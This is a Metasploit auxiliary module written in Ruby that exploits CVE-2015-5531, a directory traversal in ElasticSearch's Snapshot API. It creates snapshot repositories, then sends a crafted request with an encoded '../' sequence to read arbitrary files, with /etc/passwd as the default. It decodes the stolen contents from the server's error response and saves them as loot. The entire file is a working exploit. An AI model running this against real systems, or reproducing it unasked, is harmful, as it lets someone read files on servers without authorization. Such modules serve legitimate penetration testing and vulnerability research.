##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'json'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
      'Description'    => %q{'This module exploits a directory traversal
      vulnerability in ElasticSearch, allowing an attacker to read arbitrary
      files with JVM process privileges, through the Snapshot API.
      '},
      'References'     =>
        [
          ['CVE', '2015-5531'],
          ['URL', 'https://packetstormsecurity.com/files/132721/Elasticsearch-Directory-Traversal.html']
        ],
      'Author'         =>
        [
          'Benjamin Smith', # Vulnerability discovery
          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit module
          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit module
        ],
      'License'        => MSF_LICENSE
   ))

    register_options(
      [
        Opt::RPORT(9200),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 7])
      ], self.class)

    deregister_options('RHOST')
  end

  def proficy?
    req1 = send_request_raw('method' => 'POST',
                            'uri'    => '/_snapshot/pwn',
                            'data' => '{"type":"fs","settings":{"location":"dsr"}}')

    req2 = send_request_raw('method' => 'POST',
                            'uri'    => '/_snapshot/pwnie',
                            'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}')

    if req1.body =~ /true/ && req2.body =~ /true/
      return true
    else
      return false
    end
  end

  def read_file(file)
    travs = '_snapshot/pwn/ev1l%2f'

    payload = '../' * datastore['DEPTH']

    travs << payload.gsub('/', '%2f')
    travs << file.gsub('/', '%2f')

    print_status("#{peer} - Checking if it's a vulnerable ElasticSearch")

    if proficy?
      print_good("#{peer} - Check successful")
    else
      print_error("#{peer} - ElasticSearch not vulnearble")
      return
    end

    print_status("#{peer} - Retrieving file contents...")

    res = send_request_raw('method' => 'GET',
                           'uri'    => travs)

    if res && (res.code == 400)
      return res.body
    else
      print_status("#{res.code}\n#{res.body}")
      return nil
    end
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{/^\//}

    contents = read_file(filename)

    if contents.nil?
      print_error("#{peer} - File not downloaded")
      return
    end

    data_hash = JSON.parse(contents)
    fcontent = data_hash['error'].scan(/\d+/).drop(2).map(&:to_i).pack('c*')
    fname = datastore['FILEPATH']

    path = store_loot(
      'elasticsearch.traversal',
      'text/plain',
      ip,
      fcontent,
      fname
    )
    print_good("#{peer} - File saved in: #{path}")
  end
end

